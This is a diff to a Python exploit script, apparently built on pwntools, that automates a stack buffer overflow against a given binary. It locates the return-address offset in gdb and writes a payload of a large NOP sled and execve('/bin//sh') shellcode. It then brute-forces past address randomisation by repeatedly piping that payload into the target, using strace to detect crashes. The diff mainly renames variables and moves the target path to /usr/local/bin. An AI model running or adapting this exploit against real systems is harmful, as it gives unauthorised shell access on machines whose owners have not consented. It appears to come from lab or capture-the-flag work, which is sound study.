@@ -14,7 +14,7 @@ log_file_path = 'strace.log'
 def cleanup(exit_code: int):
 
     os.remove("trash")
-    os.remove("vuln_payload")
+    os.remove("payload")
     os.remove("strace.log")
     sys.exit(exit_code)
 
@@ -45,9 +45,10 @@ def generate_test():
     return cyclic(1000)
 
 
-def locate_ra(pattern):
+def locate_ra(pattern, target):
+
     gdb_proc = subprocess.Popen(
-        [f"gdb vuln"], 
+        [f"gdb {target}"], 
         stdin=subprocess.PIPE, 
         stdout=subprocess.PIPE, 
         stderr=subprocess.PIPE, 
@@ -87,7 +88,7 @@ def locate_ra(pattern):
     return offset
 
 
-def target_ra(vuln):
+def target_ra(target):
 
     #find in what adresses the stack fluctuates -> info proc mapping
 
@@ -97,7 +98,7 @@ def target_ra(vuln):
     open("trash", "wb").write(trash)  
 
     gdb_process = subprocess.Popen(
-        f"gdb {vuln}", 
+        f"gdb {target}", 
         stdin=subprocess.PIPE, 
         stdout=subprocess.PIPE, 
         stderr=subprocess.PIPE, 
@@ -122,9 +123,9 @@ def target_ra(vuln):
     return output
 
 
-def construct_payload(offset, vuln):
+def construct_payload(offset, target):
 
-    middle = stack_middle_address(target_ra(vuln))
+    middle = stack_middle_address(target_ra(target))
     shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
 
     #!!! will change
@@ -136,7 +137,7 @@ def construct_payload(offset, vuln):
     payload += b'\x90' * 200000
     payload += shellcode
 
-    open("vuln_payload", "wb").write(payload)
+    open("payload", "wb").write(payload)
 
 
 def drain_fd(fd: int):
@@ -188,6 +189,7 @@ def detect_crash(pid: int):
             for line in lines:
 
                 if pattern.search(line):
+                    print(line)
                     return True
 
     except FileNotFoundError:
@@ -228,25 +230,25 @@ def main():
         print("No executable file provided")
         sys.exit(1)
 
-    vuln = sys.argv[1]
+    target = sys.argv[1]
     
 
-    if not os.access(f'/app/{vuln}', os.X_OK):
-        print(f"./{vuln}: Permission denied")
+    if not os.access(f'/usr/local/bin/{target}', os.X_OK):
+        print(f"{target}: Permission denied")
         sys.exit(1)
 
-    context.log_level='warn'
+    # context.log_level='warn'
 
     #this program has PIE enabled -> compilation option that changes the location of the executable in every run
 
-    ra_offset = locate_ra(generate_test())
-    construct_payload(ra_offset, vuln)
+    ra_offset = locate_ra(generate_test(), target)
+    construct_payload(ra_offset, target)
     attach_strace()
 
     # context.log_level = 'debug'
 
     #performing brute force attack
-    exploit_command = f"cat vuln_payload - | ./{vuln} " + " ".join(["`cat trash`"] * 15)
+    exploit_command = f"cat payload - | {target} " + " ".join(["`cat trash`"] * 15)
     i = 0
     while True:
         print(f"Attempt: {i}")
